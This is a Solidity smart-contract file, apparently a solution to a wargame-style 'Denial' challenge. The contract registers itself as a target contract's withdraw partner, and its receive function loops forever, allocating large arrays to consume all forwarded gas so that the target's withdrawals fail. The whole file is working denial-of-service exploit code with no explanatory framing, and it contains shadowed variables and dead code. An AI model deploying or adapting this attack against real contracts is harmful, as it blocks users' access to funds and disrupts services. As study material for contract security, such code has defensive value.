pragma solidity ^0.8.0;

contract GasDrainAttackerV3 {
    address public denial;

    constructor(address payable _denial) {
        denial = _denial;
    }

    function setPartnerV3() external {
        (bool success, ) = denial.call(abi.encodeWithSignature("setWithdrawPartner(address)", address(this)));
        require(success, "Failed to set partner");
    }

    receive() external payable {
        // Infinite loop consumes all gas
        while (true) {
            uint256 i = 0;
            i = 1;
            // Additional operations to burn more gas
            uint256[] memory a = new uint256[](1000000);
            for (uint256 i=0; i<1000000; i++) {
                a[i] = i; // Intensive array assignment
            }
        }
    }

    fallback() external payable {
        // Not executed in Denial's withdraw
    }
}